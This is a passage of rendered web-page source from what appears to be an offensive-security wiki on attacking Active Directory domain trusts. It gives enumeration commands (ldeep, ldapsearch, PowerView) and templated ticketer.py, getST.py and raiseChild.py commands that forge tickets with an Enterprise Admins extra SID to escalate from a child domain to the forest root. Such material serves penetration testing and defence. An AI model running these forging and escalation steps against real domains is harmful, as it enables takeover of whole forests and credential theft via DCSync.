<span class="line"><span>│ │ ├── Default Shadow Principal Container (CN=Shadow Principal Configuration)</span></span>
<span class="line"><span>│ │ │ ├── Shadow Principal object</span></span>
<span class="line"><span>│ │ │ │ ├── name: prodForest-ShadowEntrepriseAdmin</span></span>
<span class="line"><span>│ │ │ │ ├── member: { BASTION/bobby, BASTION/jason } (Users in Bastion Forest)</span></span>
<span class="line"><span>│ │ │ │ ├── msDS-ShadowPrincipalSid: S-1-5-21-[...]-519 (Entreprise Admins @ PRODUCTION.LOCAL)</span></span>
<span class="line"><span>│ │ │ │ ├── ...</span></span>
<span class="line"><span>│ │ │ ├── Shadow Principal object</span></span>
<span class="line"><span>│ │ │ │ ├── name: prodForest-ShadowDomainAdmin</span></span>
<span class="line"><span>│ │ │ │ ├── member: { BASTION/max, BASTION/jason } (Users in Bastion Forest)</span></span>
<span class="line"><span>│ │ │ │ ├── msDS-ShadowPrincipalSid: S-1-5-21-[...]-512 (Domain Admins @ PRODUCTION.LOCAL)</span></span>
<span class="line"><span>│ │ │ │ ├── ...</span></span>
<span class="line"><span>│ │ ├── [...]</span></span></code></pre></div></details><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><p>While domain trusts don&#39;t necessarily give access to resources, they allow the trusted domain&#39;s principal to query another -trusting- domain&#39;s AD info.</p><blockquote><p>And remember that all parent-&gt;child (intra-forest domain trusts) retain an implicit two way transitive trust with each other. Also, due to how child domains are added, the “Enterprise Admins” group is automatically added to Administrators domain local group in each domain in the forest. This means that trust “flows down” from the forest root, making it our objective to move from child to forest root at any appropriate step in the attack chain. (from <a href="https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d" target="_blank" rel="noreferrer">Will Schroeder&#39;s &quot; A Guide to Attacking Domain Trusts&quot;</a>).</p></blockquote><p>Attacking AD trusts comes down to the following process.</p><ol><li>Map all direct and indirect trusts involved with an already compromised domain.</li><li>All domains from the same forest are to be considered as first-choice targets (<a href="./index#sid-filtering">SID filtering</a> would be disabled, allowing for <a href="./index#forging-tickets">Forging a ticket</a> with an <a href="./index#sid-history">SID history</a>).</li><li>For the others, permissions must be audited to finds ways in trusting domains. This is done by finding out what trusted principals can do on trusting resources (Kerberos delegations, groups membership, DACLs, etc.), and then <a href="./index#abusing-permissions">abuse those permissions</a>. All regular AD movement techniques apply, except the target resources and the account used to authenticate are not on the same domain, that&#39;s basically it.</li></ol><h3 id="enumeration" tabindex="-1">Enumeration <a class="header-anchor" href="#enumeration" aria-label="Permalink to &quot;Enumeration&quot;">​</a></h3><p>Several tools can be used to enumerate trust relationships. The following major characteristic must be looked for, some of which are directly readable from the <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_f2ceef4e-999b-4276-84cd-2e2829de5fc4" target="_blank" rel="noreferrer">TDO (Trusted Domain Object)</a> attributes and others need a little bit of logic.</p><ul><li>Trust partner: trusting domain for outbound trusts, trusted domain for inbound trusts. Bidirectional trusts are two one-way trusts. Retrieved from the TDO attribute <code>trustPartner</code> value.</li><li>Trust direction: inbound, outbound, or bidirectional. Retrieved from the TDO attribute <code>trustDirection</code> integer value.</li><li>Trust type: Parent-Child, Tree-Root, Shortcut (a.k.a. &quot;Cross-Link&quot;), Forest, External, or Realm (a.k.a. &quot;Kerberos&quot;).</li><li>Trust authentication level, transitivity, TGT delegation and SID filtering: Retrieved from a set of flags in the TDO&#39;s <code>trustAttributes</code> attribute, combined with the type of trust (see <a href="./index#authentication-level">authentication level</a>, <a href="./index#transitivity">transitivity</a>, <a href="./index#tgt-delegation">TGT delegation</a> and <a href="./index#sid-filtering">SID filtering</a>).</li></ul><div class="tip custom-block"><p></p><blockquote><p>Keep in mind that there is a TDO [(<a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_f2ceef4e-999b-4276-84cd-2e2829de5fc4" target="_blank" rel="noreferrer">Trusted Domain Object</a>)] for each side of the Trust relationship so always analyze both TDOs for each trust. [...]</p><p>It&#39;s important to check both ends of the trust (because the characteristics could differ). [...]</p><p>All the trust relationship information is fetched via LDAP and preferably (if that server is operational) from the Global Catalog server. As the Global catalog contains information about every object in the forest it might also contain information about trust entities that you can&#39;t reach (e.g. due to network segmentation or because they are offline).</p><p><em>(by</em> <a href="https://twitter.com/0xcsandker" target="_blank" rel="noreferrer"><em>Carsten Sandker</em></a> <em>on</em> <a href="https://www.securesystems.de/blog/active-directory-spotlight-trusts-part-2-operational-guidance/" target="_blank" rel="noreferrer"><em>www.securesystems.de</em></a><em>)</em></p></blockquote></div>`,84)),a(n,null,{default:i(()=>[a(r,{label:"UNIX-like"},{default:i(()=>s[0]||(s[0]=[e("p",null,[t("From UNIX-like systems, tools like "),e("a",{href:"https://github.com/franc-pentest/ldeep",target:"_blank",rel:"noreferrer"},"ldeep"),t(" (Python), "),e("a",{href:"https://github.com/dirkjanm/ldapdomaindump",target:"_blank",rel:"noreferrer"},"ldapdomaindump"),t(" (Python), "),e("a",{href:"https://github.com/yaap7/ldapsearch-ad",target:"_blank",rel:"noreferrer"},"ldapsearch-ad"),t(" (Python) and "),e("a",{href:"https://git.openldap.org/openldap/openldap",target:"_blank",rel:"noreferrer"},"ldapsearch"),t(" (C) can be used to enumerate trusts.")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# ldeep supports cleartext, pass-the-hash, pass-the-ticket, etc.")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"ldeep"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ldap"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -d"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -s"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' ldap://"'),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_IP"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," trusts")]),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# ldapdomaindump will store HTML, JSON and Greppable output")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"ldapdomaindump"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --user"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN\\USER'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --password"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --outdir"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "ldapdomaindump"'),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_HOST"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')]),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# ldapsearch-ad")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"ldapsearch-ad"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --server"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_HOST"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --domain"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --username"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --password"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --type"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," trusts")]),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# ldapsearch")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"ldapsearch"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -h"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' ldap://"'),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_IP"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -b"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "CN=SYSTEM,DC='),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "(objectclass=trustedDomain)"')])])])],-1),e("p",null,[e("a",{href:"./../../recon/bloodhound/index"},"BloodHound"),t(" can also be used to map the trusts. While it doesn't provide much details, it shows a visual representation.")],-1)])),_:1}),a(r,{label:"Windows"},{default:i(()=>s[1]||(s[1]=[e("p",null,[t('From Windows systems, many tools like can be used to enumerate trusts. "'),e("a",{href:"https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts",target:"_blank",rel:"noreferrer"},"A Guide to Attacking Domain Trusts"),t('" by '),e("a",{href:"https://twitter.com/harmj0y",target:"_blank",rel:"noreferrer"},"Will Schroeder"),t(' provides more in-depth guidance on how to enumerate and visually map domain trusts (in the "Visualizing Domain Trusts" section), as well as identify potential attack paths ("Foreign Relationship Enumeration" section).')],-1),e("h4",{id:"netdom",tabindex:"-1"},[t("netdom "),e("a",{class:"header-anchor",href:"#netdom","aria-label":'Permalink to "netdom"'},"​")],-1),e("p",null,[t("From domain-joined hosts, the "),e("code",null,"netdom"),t(" cmdlet can be used.")],-1),e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"netdom trust "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"domain:DOMAIN.LOCAL")])])])],-1),e("h4",{id:"powerview",tabindex:"-1"},[t("PowerView "),e("a",{class:"header-anchor",href:"#powerview","aria-label":'Permalink to "PowerView"'},"​")],-1),e("p",null,[t("Alternatively, "),e("a",{href:"https://github.com/PowerShellMafia/PowerSploit",target:"_blank",rel:"noreferrer"},"PowerSploit"),t("'s "),e("a",{href:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1",target:"_blank",rel:"noreferrer"},"PowerView"),t(" (PowerShell) supports multiple commands for various purposes.")],-1),e("table",{tabindex:"0"},[e("thead",null,[e("tr",null,[e("th",null,"Command"),e("th",null,"Alias"),e("th",null,"Description")])]),e("tbody",null,[e("tr",null,[e("td",null,[e("code",null,"Get-DomainTrust")]),e("td",null,[e("code",null,"Get-NetDomainTrust")]),e("td",null,"gets all trusts for the current user's domain")]),e("tr",null,[e("td",null,[e("code",null,"Get-ForestTrust")]),e("td",null,[e("code",null,"Get-NetForestTrust")]),e("td",null,"gets all trusts for the forest associated with the current user's domain")]),e("tr",null,[e("td",null,[e("code",null,"Get-DomainForeignUser")]),e("td",null,[e("code",null,"Find-ForeignUser")]),e("td",null,"enumerates users who are in groups outside of their principal domain")]),e("tr",null,[e("td",null,[e("code",null,"Get-DomainForeignGroupMember")]),e("td",null,[e("code",null,"Find-ForeignGroup")]),e("td",null,"enumerates all the members of a domain's groups and finds users that are outside of the queried domain")]),e("tr",null,[e("td",null,[e("code",null,"Get-DomainTrustMapping")]),e("td",null,[e("code",null,"Invoke-MapDomainTrust")]),e("td",null,"try to build a relational mapping of all domain trusts")])])],-1),e("blockquote",null,[e("p",null,[t("The "),e("a",{href:"https://technet.microsoft.com/en-us/library/cc728188(v=ws.10).aspx",target:"_blank",rel:"noreferrer"},"global catalog is a partial copy of all objects"),t(" in an Active Directory forest, meaning that some object properties (but not all) are contained within it. This data is replicated among all domain controllers marked as global catalogs for the forest. Trusted domain objects are replicated in the global catalog, so we can enumerate every single internal and external trust that all domains in our current forest have extremely quickly, and only with traffic to our current PDC.")]),e("p",null,[e("em",null,"(by"),t(),e("a",{href:"https://twitter.com/harmj0y",target:"_blank",rel:"noreferrer"},[e("em",null,"Will Schroeder")]),t(),e("em",null,"on"),t(),e("a",{href:"https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/",target:"_blank",rel:"noreferrer"},[e("em",null,"blog.harmj0y.net")]),e("em",null,")")])],-1),e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Get-DomainTrust"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"SearchBase "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"GC://'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"$"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"("),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"ENV:"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"USERDNSDOMAIN"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},")"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')])])])],-1),e("p",null,[t("The global catalog can be found in many ways, including a simple DNS query (see "),e("a",{href:"./../../recon/dns#finding-domain-controllers"},"DNS recon"),t(").")],-1),e("h4",{id:"bloodhound",tabindex:"-1"},[t("BloodHound "),e("a",{class:"header-anchor",href:"#bloodhound","aria-label":'Permalink to "BloodHound"'},"​")],-1),e("p",null,[e("a",{href:"./../../recon/bloodhound/index"},"BloodHound"),t(" can also be used to map the trusts. While it doesn't provide much details, it shows a visual representation.")],-1)])),_:1})]),_:1}),s[5]||(s[5]=o('<p>In addition to enumerating trusts, retrieving information about the permissions of trusted principals against trusting resources could also allow for lateral movement and privilege escalation. The recon techniques will depend on the permissions to abuse (<a href="./index#dacl-abuse">DACL</a>, <a href="./../kerberos/delegations/index">Kerberos delegations</a>, etc.).</p><details class="details custom-block"><summary>Notes on Bastion Forests</summary><p>A forest is probably managed by a Bastion Forest when the <code>TRUST_ATTRIBUTE_PIM_TRUST (0x400)</code> flag is set in the trust attributes.</p><p>To enumerate the Shadow Security Principals, and LDAP query can be made to list the <code>Name</code>, <code>member</code>, and <code>msDS-ShadowPrincipalSid</code> attributes of Shadow Principals in the <code>CN=Shadow Principal Configuration,CN=Services,{CONFIGURATION_NAMING_CONTEXT}</code> container.</p><ul><li><code>name</code>: name of the shadow principal</li><li><code>member</code>: principals (from the Bastion Forest) mapped to it</li><li><code>msDS-ShadowPrincipalSid</code>: the SID of the principal (from the Production Forest) whose privileges are assigned to the shadow security principal.</li></ul></details><h3 id="forging-tickets" tabindex="-1">Forging tickets <a class="header-anchor" href="#forging-tickets" aria-label="Permalink to &quot;Forging tickets&quot;">​</a></h3><p>When forging a <a href="./index#kerberos-authentication">referral ticket</a>, or a <a href="./../kerberos/forged-tickets/golden">golden ticket</a>, additional security identifiers (SIDs) can be added as &quot;extra SID&quot; and be considered as part of the user&#39;s <a href="./index#sid-history">SID history</a> when authenticating. Alternatively, the SID could be added beforehand, directly in the SID history attribute, with mimikatz <a href="https://tools.thehacker.recipes/mimikatz/modules/sid/add" target="_blank" rel="noreferrer"><code>sid:add</code></a> command, but that&#39;s a topic for another day.</p><p>Then, when using the ticket, the SID history would be taken into account and could grant elevated privileges (depending on how <a href="./index#sid-filtering">SID filtering</a> is configured in the trust)</p><ul><li>If the attacker is moving across an intra-forest trust, it would allow to compromise the forest root, and by extension, all the forest, since Enterprise Admins can access all domains&#39; domain controllers as admin (because the security boundary is the forest, not the domain).</li><li>If the attacker is moving across an inter-forest trust, it could allow to compromise the trusting domain, depending on how <a href="./index#sid-filtering">SID filtering</a> is configured, and if there are some groups that have sufficient permissions.</li></ul><p>In conclusion, before attacking trusts, it&#39;s required to enumerate them, as well as enumerate the target (trusting) domain&#39;s resources. See <a href="./index#enumeration">enumeration</a>.</p><ul><li>If SID filtering is disabled in the targeted trust relationship (see <a href="./index#sid-filtering">SID filtering</a> and <a href="./index#enumeration">Enumeration</a>), a ticket (inter-realm/referral ticket, or golden ticket) can be forged with an extra SID that contains the root domain and the RID of the &quot;Enterprise Admins&quot; group (i.e. <code>S-1-5-21--519</code>). The ticket can then be used to access the trusting domain controller as admin and conduct a <a href="./../credentials/dumping/dcsync">DCSync</a> attack.</li><li>If SID filtering is partially enabled (sometimes referred to as <a href="./index#sid-history">SID history enabled</a>), effectively only filtering out RID &lt;1000, a ticket can be forged with an extra SID that contains the target domain and the RID of any group, with RID &gt;= 1000). The ticket can then be used to conduct more attacks depending on the group&#39;s privileges.</li></ul><blockquote><p>For example the Exchange security groups, which allow for a <a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" target="_blank" rel="noreferrer">privilege escalation to DA</a> in many setups all have RIDs larger than 1000. Also many organisations will have custom groups for workstation admins or helpdesks that are given local Administrator privileges on workstations or servers.</p><p><em>(by</em> <a href="https://twitter.com/_dirkjan" target="_blank" rel="noreferrer"><em>Dirk-jan Mollema</em></a> <em>on</em> <a href="https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/" target="_blank" rel="noreferrer"><em>dirkjanm.io</em></a><em>)</em></p></blockquote><ul><li>If SID filtering is fully enabled, the techniques presented above will not work since all SIDs that differ from the trusted domain will be filtered out. This is usually the case with standard inter-forest trusts. Attackers must then fall back to other methods of <a href="./index#abusing-permissions">permissions abuse</a>. Alternatively, there are a few SIDs that won&#39;t be filtered out (see <a href="./index#sid-filtering">SID filtering</a> theory and <a href="./index#sid-filtering-bypass">SID filtering bypass</a> practice).</li></ul><div class="tip custom-block"><p>If the attacker chooses to forge an inter-realm ticket forgery (i.e. referral ticket), a service ticket request must be conducted before trying to access the domain controller. In the case of a golden ticket, the target domain controller will do the hard work itself. Once the last ticket is obtained, it can be used with <a href="./../kerberos/ptt">pass-the-ticket</a> for the <a href="./../credentials/dumping/dcsync">DCSync</a> (if enough privileges, or any other operation if not).</p></div>',11)),a(n,null,{default:i(()=>[a(r,{label:"UNIX-like"},{default:i(()=>s[2]||(s[2]=[e("p",null,[t("From UNIX-like systems, "),e("a",{href:"https://github.com/fortra/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),t(" scripts (Python) can be used for that purpose.")],-1),e("ul",null,[e("li",null,"ticketer.py to forge tickets"),e("li",null,"getST.py to request service tickets"),e("li",null,"lookupsid.py to retrieve the domains' SIDs")],-1),e("p",null,"If SID filtering is disabled, set the RID to 519 to act as Enterprise Admin.",-1),e("p",null,"If SID filtering is partially enabled, set the RID >=1000.",-1),e("h5",{id:"referral-ticket",tabindex:"-1"},[t("Referral ticket "),e("a",{class:"header-anchor",href:"#referral-ticket","aria-label":'Permalink to "Referral ticket"'},"​")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 1. forge the ticket")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"ticketer.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -nthash"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "inter-realm key"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -domain-sid"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "child_domain_SID"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -domain"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "child_domain_FQDN"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -extra-sid"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "<root_domain_SID>-<RID>"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -spn"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "krbtgt/root_domain_fqdn"'),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "someusername"')]),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 2. use it to request a service ticket")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"KRB5CCNAME"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"someusername.ccache"'),e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}}," getST.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -k"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -no-pass"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -debug"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -spn"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "CIFS/domain_controller"'),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "root_domain_fqdn/someusername@root_domain_fqdn"')])])])],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"ticketer.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -nthash"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "child_domain_krbtgt_NT_hash"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -domain-sid"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "child_domain_SID"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -domain"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "child_domain_FQDN"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -extra-sid"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "-"'),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "someusername"')])])])],-1),e("p",null,[t("Impacket's "),e("a",{href:"https://github.com/fortra/impacket/blob/master/examples/raiseChild.py",target:"_blank",rel:"noreferrer"},"raiseChild.py"),t(" script can also be used to conduct the golden ticket technique automatically when SID filtering is disabled (retrieving the SIDs, dumping the trusted domain's krbtgt, forging the ticket, dumping the forest root keys, etc.). It will forge a ticket with the Enterprise Admins extra SID.")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"raiseChild.py"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "child_domain"/"child_domain_admin":"'),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')])])])],-1)])),_:1}),a(r,{label:"🛠️ Windows"},{default:i(()=>s[3]||(s[3]=[e("p",null,"// TODO",-1)])),_:1})]),_:1}),s[6]||(s[6]=o(`<h3 id="🛠️-sid-filtering-bypass" tabindex="-1">🛠️ SID filtering bypass <a class="header-anchor" href="#🛠️-sid-filtering-bypass" aria-label="Permalink to &quot;🛠️ SID filtering bypass&quot;">​</a></h3><blockquote><p>a few SIDs will (almost) never be filtered: &quot;Enterprise Domain Controllers&quot; (S-1-5-9) SID and those described by the <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/f2ef15b6-1e9b-48b5-bf0b-019f061d41c8#gt_f2ceef4e-999b-4276-84cd-2e2829de5fc4" target="_blank" rel="noreferrer">trusted domain object (TDO)</a>, as well as seven well-known SIDs (see <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280" target="_blank" rel="noreferrer">MS-PAC doc</a>, and <a href="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-3-sid-filtering-explained#yui_3_17_2_1_1673614140169_543" target="_blank" rel="noreferrer">improsec&#39;s blogpost</a>).</p><p><em>(</em><a href="./index#sid-filtering"><em>SID filtering</em></a> <em>theory)</em></p></blockquote><p><em>//</em> <a href="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research" target="_blank" 